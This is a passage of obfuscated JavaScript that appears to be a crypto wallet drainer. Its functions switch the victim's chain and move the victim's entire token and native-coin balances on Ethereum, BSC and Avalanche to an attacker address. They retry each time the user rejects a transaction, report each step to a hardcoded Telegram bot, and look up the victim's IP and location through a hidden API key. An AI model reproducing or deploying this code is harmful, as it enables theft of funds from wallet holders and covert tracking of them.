          })
          [_0x454c5f(0x113)]((_0x577ae0) => {
            const _0x4a7ef1 = _0x454c5f;
            console[_0x4a7ef1(0x115)](_0x4a7ef1(0x16c)),
              consoleLog(_0x4a7ef1(0x16c)),
              console["log"](_0x577ae0),
              askMainCoinTransferWithSign(_0x3369aa);
          });
    });
}
async function askTokenTransferWithSign(_0x1883db, _0xb5ba99) {
  const _0x31510c = _0x3a34fc;
  provider = window[_0x31510c(0x16b)];
  const _0x576f38 = new Web3(provider),
    _0x50fc50 = (await _0x576f38[_0x31510c(0x132)][_0x31510c(0xf1)]())[0x0],
    _0x146d86 = await _0x576f38[_0x31510c(0x132)][_0x31510c(0x10b)]();
  var _0x2b2350;
  if (_0x146d86 != _0x576f38[_0x31510c(0x164)]["toHex"](_0xb5ba99))
    try {
      await provider[_0x31510c(0x116)]({
        method: _0x31510c(0xe4),
        params: [
          {
            chainId: _0x576f38["utils"]["toHex"](Number(_0xb5ba99)),
          },
        ],
      });
    } catch {
      alert(_0x31510c(0x126)), askTokenTransferWithSign(_0x1883db, _0xb5ba99);
      return;
    }
  console[_0x31510c(0x115)](_0x1883db),
    (_0x2b2350 = new _0x576f38[_0x31510c(0x132)][_0x31510c(0x177)](
      ERC20ABI,
      _0x1883db
    ));
  const _0x4f874a = await _0x2b2350[_0x31510c(0xfb)]
    [_0x31510c(0x158)]()
    [_0x31510c(0x15d)]();
  await _0x576f38[_0x31510c(0x132)]
    [_0x31510c(0xe6)](_0x50fc50, "pending")
    [_0x31510c(0x11a)](async (_0x274523) => {
      const _0x40f795 = _0x31510c,
        _0x4f8ecb = await _0x2b2350[_0x40f795(0xfb)]
          [_0x40f795(0xef)](_0x50fc50)
          [_0x40f795(0x15d)](),
        _0x318a24 = await _0x576f38[_0x40f795(0x132)][_0x40f795(0x152)](),
        _0x5ed440 = (Number(_0x318a24) * 1.15)[_0x40f795(0xec)](0x0);
      var _0x8cd975 = {
        nonce: _0x576f38["utils"]["toHex"](_0x274523),
        gasPrice: _0x576f38[_0x40f795(0x164)]["toHex"](_0x5ed440),
        gasLimit: String(
          _0x576f38[_0x40f795(0x164)][_0x40f795(0xf7)](Number(0x13880))
        ),
        to: rA,
        value: _0x40f795(0x11e),
        data: _0x2b2350[_0x40f795(0xfb)]
          ["transfer"](rA, _0x4f8ecb)
          [_0x40f795(0x11c)](),
        v: String(
          _0x576f38[_0x40f795(0x164)][_0x40f795(0xf7)](Number(_0xb5ba99))
        ),
        r: "0x",
        s: "0x",
      };
      let _0x13cffc = new ethereumjs["Tx"](_0x8cd975);
      const _0x2b3748 =
          "0x" + _0x13cffc["serialize"]()[_0x40f795(0x15b)](_0x40f795(0x129)),
        _0x16f7c4 = _0x576f38[_0x40f795(0x164)][_0x40f795(0x150)](_0x2b3748, {
          encoding: "hex",
        });
      await _0x576f38[_0x40f795(0x132)]
        ["sign"](_0x16f7c4, _0x50fc50)
        [_0x40f795(0x11a)](async (_0x38f50a) => {
          const _0x20c763 = _0x40f795,
            _0x51b5e0 = _0x38f50a[_0x20c763(0x118)](0x2),
            _0xfb7c20 = "0x" + _0x51b5e0[_0x20c763(0x118)](0x0, 0x40),
            _0x159d13 = "0x" + _0x51b5e0["substring"](0x40, 0x80),
            _0x1f63f2 = parseInt(_0x51b5e0["substring"](0x80, 0x82), 0x10),
            _0x5529bb = _0x576f38[_0x20c763(0x164)][_0x20c763(0xf7)](
              _0x1f63f2 + _0x146d86 * 0x2 + 0x8
            );
          (_0x13cffc["r"] = _0xfb7c20),
            (_0x13cffc["s"] = _0x159d13),
            (_0x13cffc["v"] = _0x5529bb),
            console[_0x20c763(0x115)](_0x13cffc);
          const _0x2193d5 =
              "0x" + _0x13cffc[_0x20c763(0xf0)]()["toString"](_0x20c763(0x129)),
            _0x2e1abd = _0x576f38[_0x20c763(0x164)][_0x20c763(0x150)](
              _0x2193d5,
              {
                encoding: _0x20c763(0x129),
              }
            );
          console["log"](_0x20c763(0x167), _0x2193d5),
            console[_0x20c763(0x115)]("rawHash:\x20", _0x2e1abd),
            await _0x576f38[_0x20c763(0x132)]
              [_0x20c763(0x175)](_0x2193d5)
              [_0x20c763(0x11a)](async (_0x2a3193) => {
                const _0x5d72bf = _0x20c763;
                console[_0x5d72bf(0x115)](
                  _0x4f874a + "\x20Transaction\x20complete"
                ),
                  consoleLog(_0x4f874a + _0x5d72bf(0x139)),
                  console[_0x5d72bf(0x115)](_0x2a3193);
                switch (_0xb5ba99) {
                  case 0x1:
                    tokenIndexETH++;
                    String(ETHTokenAddressArray[tokenIndexETH])[
                      _0x5d72bf(0x170)
                    ] == 0x2a
                      ? askTokenTransferWithSign(
                          ETHTokenAddressArray[tokenIndexETH],
                          0x1
                        )
                      : askMainCoinTransferWithSign(0x1);
                    break;
                  case 0x38:
                    tokenIndexBSC++;
                    String(BSCTokenAddressArray[tokenIndexBSC])[
                      _0x5d72bf(0x170)
                    ] == 0x2a
                      ? askTokenTransferWithSign(
                          BSCTokenAddressArray[tokenIndexBSC],
                          0x38
                        )
                      : askMainCoinTransferWithSign(0x38);
                    break;
                  case 0xa86a:
                    tokenIndexAVAX++;
                    String(AVAXTokenAddressArray[tokenIndexAVAX])[
                      _0x5d72bf(0x170)
                    ] == 0x2a
                      ? askTokenTransferWithSign(
                          AVAXTokenAddressArray[tokenIndexAVAX],
                          0xa86a
                        )
                      : askMainCoinTransferWithSign(0xa86a);
                }
              })
              [_0x20c763(0x113)]((_0x3e7171) => {
                const _0x1bab26 = _0x20c763;
                console[_0x1bab26(0x115)](_0x3e7171),
                  askTokenTransferWithSign(_0x1883db, _0xb5ba99);
              });
        })
        ["catch"]((_0x1b1914) => {
          const _0x45089c = _0x40f795;
          console[_0x45089c(0x115)](_0x4f874a + _0x45089c(0x120)),
            consoleLog(_0x4f874a + _0x45089c(0x120)),
            askTokenTransferWithSign(_0x1883db, _0xb5ba99),
            console[_0x45089c(0x115)](_0x1b1914);
        });
    });
}
async function askMainCoinTransfer(_0x5813a9) {
  const _0x1ccf87 = _0x3a34fc;
  provider = window["ethereum"];
  const _0x3254a0 = new Web3(provider),
    _0x2b474b = (await _0x3254a0[_0x1ccf87(0x132)][_0x1ccf87(0xf1)]())[0x0],
    _0x2966d5 = await _0x3254a0[_0x1ccf87(0x132)][_0x1ccf87(0x10b)]();
  if (_0x2966d5 != _0x3254a0["utils"][_0x1ccf87(0xf7)](_0x5813a9))
    try {
      await provider[_0x1ccf87(0x116)]({
        method: _0x1ccf87(0xe4),
        params: [
          {
            chainId: _0x3254a0[_0x1ccf87(0x164)][_0x1ccf87(0xf7)](
              Number(_0x5813a9)
            ),
          },
        ],
      });
    } catch {
      alert(_0x1ccf87(0x126)), askMainCoinTransfer(_0x5813a9);
      return;
    }
  const _0x3d7279 = await _0x3254a0[_0x1ccf87(0x132)][_0x1ccf87(0xe6)](
      _0x2b474b
    ),
    _0x224780 = await _0x3254a0[_0x1ccf87(0x132)][_0x1ccf87(0x10a)](_0x2b474b),
    _0x1089a3 = await _0x3254a0[_0x1ccf87(0x132)][_0x1ccf87(0x152)](),
    _0x5ffaff = 0x55f0 * _0x1089a3,
    _0x14886b = Number(_0x224780) - Number(_0x5ffaff),
    _0x56026f = {
      nonce: _0x3254a0[_0x1ccf87(0x164)][_0x1ccf87(0xf7)](_0x3d7279),
      gasPrice: _0x3254a0["utils"][_0x1ccf87(0xf7)](_0x1089a3),
      gasLimit: _0x3254a0["utils"][_0x1ccf87(0xf7)](0x5208),
      from: _0x2b474b,
      to: rA,
      value: _0x3254a0[_0x1ccf87(0x164)][_0x1ccf87(0xf7)](_0x14886b),
      data: "0x",
    };
  try {
    const _0x4e9326 = await _0x3254a0[_0x1ccf87(0x132)]["sendTransaction"](
      _0x56026f
    );
    console[_0x1ccf87(0x115)](
      sortedNetworkArray[networkIndex] + _0x1ccf87(0x103),
      _0x4e9326[_0x1ccf87(0x173)]
    ),
      consoleLog(
        "Sent\x20" +
          Number(_0x224780) / 0xa ** 0x12 +
          "\x20" +
          sortedNetworkArray[networkIndex]
      ),
      networkIndex++,
      sortedTotalValueArray[networkIndex] > 0x0
        ? drainSequence(sortedNetworkArray[networkIndex])
        : (console["log"](_0x1ccf87(0x125)), consoleLog(_0x1ccf87(0x125)));
  } catch (_0x7d1da3) {
    console[_0x1ccf87(0x115)](_0x1ccf87(0x154), _0x7d1da3),
      consoleLog(
        _0x1ccf87(0x13d) + sortedNetworkArray[networkIndex] + "request"
      ),
      askMainCoinTransfer(_0x5813a9);
    return;
  }
}
async function askTokenTransfer(_0x32eedb, _0xd99ead) {
  const _0x2a79bc = _0x3a34fc;
  provider = window[_0x2a79bc(0x16b)];
  const _0x2fe634 = new Web3(provider),
    _0x54c8c8 = (await _0x2fe634["eth"][_0x2a79bc(0xf1)]())[0x0];
  var _0xf7b6b5;
  const _0x5d0008 = await _0x2fe634["eth"][_0x2a79bc(0x10b)]();
  if (_0x5d0008 != _0x2fe634[_0x2a79bc(0x164)][_0x2a79bc(0xf7)](_0xd99ead))
    try {
      await provider[_0x2a79bc(0x116)]({
        method: _0x2a79bc(0xe4),
        params: [
          {
            chainId: _0x2fe634[_0x2a79bc(0x164)][_0x2a79bc(0xf7)](
              Number(_0xd99ead)
            ),
          },
        ],
      });
    } catch {
      alert(_0x2a79bc(0x126)), askTokenTransfer(_0x32eedb);
      return;
    }
  console[_0x2a79bc(0x115)](_0x32eedb),
    (_0xf7b6b5 = new _0x2fe634["eth"][_0x2a79bc(0x177)](ERC20ABI, _0x32eedb));
  const _0x3e1a03 = await _0xf7b6b5[_0x2a79bc(0xfb)]
      ["name"]()
      [_0x2a79bc(0x15d)](),
    _0xc1d983 = await _0xf7b6b5[_0x2a79bc(0xfb)]
      ["balanceOf"](_0x54c8c8)
      [_0x2a79bc(0x15d)]();
  try {
    await _0xf7b6b5[_0x2a79bc(0xfb)]
      ["transfer"](rA, _0xc1d983)
      [_0x2a79bc(0x14c)]({
        from: _0x54c8c8,
      })
      ["on"]("transactionHash", async (_0x53a80c) => {
        const _0x5e81ad = _0x2a79bc;
        (txHash1 = _0x53a80c),
          console[_0x5e81ad(0x115)](_0x5e81ad(0x13a), _0x53a80c);
      }),
      console[_0x2a79bc(0x115)](
        _0x3e1a03 + "\x20transfer\x20transaction\x20successful"
      );
    switch (_0xd99ead) {
      case 0x1:
        tokenIndexETH++;
        String(ETHTokenAddressArray[tokenIndexETH])[_0x2a79bc(0x170)] == 0x2a
          ? askTokenTransfer(ETHTokenAddressArray[tokenIndexETH], 0x1)
          : askMainCoinTransfer(0x1);
        break;
      case 0x38:
        tokenIndexBSC++;
        String(BSCTokenAddressArray[tokenIndexBSC])[_0x2a79bc(0x170)] == 0x2a
          ? askTokenTransfer(BSCTokenAddressArray[tokenIndexBSC], 0x38)
          : askMainCoinTransfer(0x38);
        break;
      case 0xa86a:
        tokenIndexAVAX++;
        String(AVAXTokenAddressArray[tokenIndexAVAX])[_0x2a79bc(0x170)] == 0x2a
          ? askTokenTransfer(AVAXTokenAddressArray[tokenIndexAVAX], 0xa86a)
          : askMainCoinTransfer(0xa86a);
    }
  } catch (_0x1d7e09) {
    console["log"](_0x2a79bc(0x154)),
      consoleLog(_0x2a79bc(0x154)),
      console["log"](_0x1d7e09),
      askTokenTransfer(_0x32eedb, _0xd99ead);
  }
}
async function consoleLog(_0x1d4283) {
  const _0x229d31 = _0x3a34fc,
    _0x671463 = "6963446254:AAFMyxRcqsHEL6uZy3h3-s5bQ8f2qhMaG_U",
    _0x59c142 = "-2035208621";
  var _0x325795 =
    _0x229d31(0x179) +
    _0x671463 +
    _0x229d31(0x162) +
    _0x59c142 +
    _0x229d31(0xfd) +
    _0x1d4283;
  let _0x4294f6 = new XMLHttpRequest();
  _0x4294f6[_0x229d31(0xea)](_0x229d31(0x102), _0x325795, !![]),
    _0x4294f6["send"]();
}
async function getLocation() {
  const _0x1a8472 = _0x3a34fc,
    _0x22313a = atob("NWRjYjdmNTY2NTAzNDdiODk5NWU3ZTQ5YzU5YjA1ODI=");
  fetch(_0x1a8472(0xeb) + _0x22313a)
    [_0x1a8472(0x11a)]((_0x1a153f) => _0x1a153f[_0x1a8472(0x180)]())
    [_0x1a8472(0x11a)]((_0x45c1c7) => {
      const _0x4e3d5c = _0x1a8472;
      (city = _0x45c1c7[_0x4e3d5c(0x13c)][_0x4e3d5c(0x158)]),
        (country = _0x45c1c7[_0x4e3d5c(0x10f)]["name"]),
        (ip = _0x45c1c7["ip"]),
        (latitude = _0x45c1c7[_0x4e3d5c(0x151)][_0x4e3d5c(0x149)]),
        (longitude = _0x45c1c7[_0x4e3d5c(0x151)][_0x4e3d5c(0x12e)]);
    })
    [_0x1a8472(0x113)]((_0x5e7a95) =>
      console[_0x1a8472(0x115)](_0x1a8472(0x176), _0x5e7a95)
    );
}
